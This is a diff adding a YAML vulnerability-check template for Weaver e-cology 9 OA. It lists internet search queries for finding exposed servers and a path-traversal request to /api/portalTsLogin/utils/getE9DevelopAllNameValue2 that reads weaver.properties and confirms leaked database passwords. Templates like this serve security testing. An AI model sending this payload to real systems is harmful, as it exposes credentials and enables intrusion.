@@ -1,0 +1,39 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="/jquery.cycle.all_wev8.js"
+    hunter-query: app.name="泛微 e-cology 9.0 OA"
+    quake-query: app:"泛微协同OA_e9"
+    zoomeye-query:
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips: 内网数据库密码泄露
+
+name: poc-yaml-ecology9-portalTsLogin-unleak
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+  t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties 
+      headers:
+      body: 
+    expression: response.status == 200 && response.body_string.contains("ecology.password")
+
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+
+expression: r0() 
